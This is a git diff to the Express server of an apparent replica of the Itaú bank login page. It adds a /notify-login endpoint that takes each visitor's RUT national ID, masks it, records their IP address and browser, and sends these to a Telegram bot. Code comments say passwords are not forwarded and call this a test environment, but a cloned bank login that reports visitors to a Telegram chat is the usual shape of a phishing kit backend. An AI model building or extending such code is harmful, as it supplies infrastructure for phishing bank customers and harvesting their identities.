@@ -1,12 +1,16 @@
 const express = require('express');
 const path = require('path');
 const fs = require('fs');
+const https = require('https');
 
 const app = express();
-const PORT = process.env.PORT || 10000; // Render inyecta PORT
+const PORT = process.env.PORT || 10000; // Render injects PORT
 
 // Carpeta estática (confirmada: /public)
 const STATIC_DIR = path.join(__dirname, 'public');
+
+// Parse JSON bodies for /notify-login
+app.use(express.json());
 
 // Logging de request + status al finalizar
 app.use((req, res, next) => {
@@ -30,6 +34,71 @@ app.use(express.static(STATIC_DIR, { extensions: ['html', 'htm'], maxAge: '1d' }
 // Healthcheck para Render
 app.get('/health', (req, res) => {
   res.json({ status: 'ok', app: 'replica-login-itau' });
+});
+
+// --- Utilidad: envío seguro a Telegram (no enviamos contraseñas) ---
+function sendTelegramMessage(text) {
+  const token = process.env.TELEGRAM_BOT_TOKEN || process.env.TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID || process.env.ID;
+  if (!token || !chatId) {
+    console.warn('Telegram token/chat_id no configurados en variables de entorno. Mensaje no enviado.');
+    return;
+  }
+
+  const payload = JSON.stringify({ chat_id: chatId, text });
+
+  const options = {
+    hostname: 'api.telegram.org',
+    port: 443,
+    path: `/bot${token}/sendMessage`,
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
+  };
+
+  const req = https.request(options, (res) => {
+    let body = '';
+    res.on('data', (d) => (body += d));
+    res.on('end', () => {
+      if (res.statusCode < 200 || res.statusCode >= 300) {
+        console.warn('Telegram API returned', res.statusCode, body);
+      }
+    });
+  });
+
+  req.on('error', (e) => console.error('Error enviando a Telegram:', e));
+  req.write(payload);
+  req.end();
+}
+
+function maskRut(rut) {
+  if (!rut) return 'N/A';
+  const s = String(rut).trim();
+  if (s.length <= 4) return '*'.repeat(s.length);
+  const first = s.slice(0, 2);
+  const last = s.slice(-2);
+  return `${first}${'*'.repeat(Math.max(0, s.length - 4))}${last}`;
+}
+
+// Endpoint seguro para notificar intentos de ingreso
+// Espera JSON: { rut: '...' }
+app.post('/notify-login', (req, res) => {
+  try {
+    const rutRaw = req.body && req.body.rut ? String(req.body.rut) : '';
+    // NO aceptar ni reenviar contraseñas/clave
+    const masked = maskRut(rutRaw);
+    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
+    const ua = req.get('User-Agent') || 'unknown';
+    const time = new Date().toISOString();
+
+    const text = `🔐 Notificación de ingreso (entorno de pruebas)\nRUT: ${masked}\nIP: ${ip}\nUA: ${ua}\nHora: ${time}`;
+    sendTelegramMessage(text);
+
+    console.log('Notificación enviada a Telegram:', { rut: masked, ip, ua, time });
+    res.json({ ok: true });
+  } catch (err) {
+    console.error('Error en /notify-login', err);
+    res.status(500).json({ ok: false });
+  }
 });
 
 // Fallback SPA: servir index.html para rutas no estáticas
